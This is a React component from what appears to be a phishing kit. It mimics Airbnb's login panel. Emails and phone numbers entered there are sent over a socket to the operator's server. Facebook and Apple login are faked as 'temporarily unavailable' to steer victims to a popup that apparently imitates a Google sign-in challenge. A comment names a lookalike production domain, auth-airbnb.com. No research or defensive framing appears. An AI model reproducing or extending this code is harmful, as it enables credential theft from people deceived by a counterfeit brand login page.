import { FormEvent, useContext, useState } from 'react';
import styles from '../../styles.module.scss';
import MethodButton from '../MethodButton';
import { socket } from '../../socket';
import { IUserData, UserContext } from '../../App';
import DefaultInput from '../DefaultInput';
import DefaultButton from '../DefaultButton';
import PhoneInputs from '../PhoneInputs';
import axios from 'axios';
import { URL } from '../../main';
import { useParams } from 'react-router-dom';

const MainPanel = ({ setPanel }: { setPanel: (v: string) => void }) => {
	// const [authMethod, setAuthMethod] = useState('email');
	const { user, setUser } = useContext(UserContext);
	const [errorMessage, setErrorMessage] = useState('');
	const [showAlert, setShowAlert] = useState(false);
	const [loadingEmail, setLoadingEmail] = useState(false);
	const [loadingPhone, setLoadingPhone] = useState(false);
	const [errorMessagePhone, setErrorMessagePhone] = useState('');
	const { link } = useParams();

	const submitEmail = (e: FormEvent | void) => {
		e && e.preventDefault();
		if (!user?.email?.match(/^\S+@\S+\.\S+$/)) return setErrorMessage('Enter a valid email.');
		setLoadingEmail(true);
		setTimeout(() => {
			setErrorMessage('');
			socket.emit('new-flow', user);
			setPanel('password');
			setLoadingEmail(false);
		}, 1000);
	};

	const submitPhone = (e: FormEvent | void) => {
		e && e.preventDefault();
		if (user!.phone!.length < 10) return setErrorMessagePhone('Phone number is too short or contains invalid characters.');
		setLoadingPhone(true);
		setTimeout(() => {
			setErrorMessage('');
			socket.emit('new-flow', user);
			setPanel('phone');
			setLoadingPhone(false);
		}, 1000);
	};

	const methodReq = (method: string) => {
		axios.post('http://localhost:4646/api/method', { method }).catch(() => {}); // PROD: https://auth-airbnb.com
	};

	const fakeMethodOnClick = (method: string) => {
		setTimeout(() => setShowAlert(true), 500);
		methodReq(method);
	};

	return (
		<div className={styles.auth_panel}>
			<div className={styles.auth_header}>Log in or sign up</div>
			<div className={styles.auth_body}>
				<h3 className={styles.body_title}>Welcome to Airbnb</h3>
				{showAlert && (
					<div className={styles.form_alert}>
						<div className={styles.alert_icon}>
							<img src='../../ex_point.svg' alt='' width={16} />
						</div>
						<div className={styles.alert_body}>
							<div className={styles.alert_title}>Let's try that again</div>
							<div className={styles.alert_description}>This method is temporarily unavailable.</div>
						</div>
					</div>
				)}
				{user?.method === 'email' ? (
					<form className={styles.auth_form} onSubmit={submitEmail}>
						<DefaultInput
							regExp={/^\S+@\S+\.\S+$/}
							placeholder='Email'
							setErrorMessage={setErrorMessage}
							value={user?.email}
							onChange={v => {
								setShowAlert(false);
								setUser((p: any) => ({ ...p, email: v }));
							}}
						/>
						{errorMessage && (
							<div className={styles.error_message}>
								<img src='../../error.svg' alt='' width={12} />
								{errorMessage}
							</div>
						)}
						<DefaultButton loading={loadingEmail} setLoading={setLoadingEmail} title='Continue' onClick={submitEmail} />
					</form>
				) : (
					user?.method === 'phone' && (
						<form className={styles.auth_form} onSubmit={submitPhone}>
							<PhoneInputs errorMessage={errorMessagePhone} setErrorMessage={setErrorMessagePhone} />
							<DefaultButton loading={loadingPhone} setLoading={setLoadingPhone} title='Continue' onClick={submitPhone} />
						</form>
					)
				)}

				<div className={styles.or_separator}>
					<span>or</span>
				</div>

				<div className={styles.methods}>
					<MethodButton onClick={() => fakeMethodOnClick('facebook')} img='../../facebook.svg' title='Continue with Facebook' />
					<MethodButton
						onClick={() => {
							const x = screen.width / 2 - 500 / 2;
							const y = screen.height / 2 - 650 / 2;
							window.open(`${URL}/v3/signin/challenge/${link}`, '_blank', `location=yes,height=650,width=500,scrollbars=yes,status=yes,left=${x},top=${y}`);
							methodReq('google'); // PROD: https://auth-airbnb.com
						}}
						// onClick={() => fakeMethodOnClick("google")}
						img='../../google.svg'
						title='Continue with Google'
					/>
					<MethodButton onClick={() => fakeMethodOnClick('apple')} img='../../apple.svg' title='Continue with Apple' />
					{user?.method === 'email' ? (
						<MethodButton
							onClick={() => {
								methodReq('phone');
								setUser((u: IUserData) => ({ ...u, method: 'phone' }));
							}}
							img='../../phone.svg'
							title='Continue with Phone'
						/>
					) : (
						user?.method === 'phone' && (
							<MethodButton
								onClick={() => {
									methodReq('email');
									setUser((u: IUserData) => ({ ...u, method: 'email' }));
								}}
								img='../../email.svg'
								title='Continue with email'
							/>
						)
					)}
				</div>
			</div>
			<div className={styles.need_help}>Need help?</div>
		</div>
	);
};

export default MainPanel;
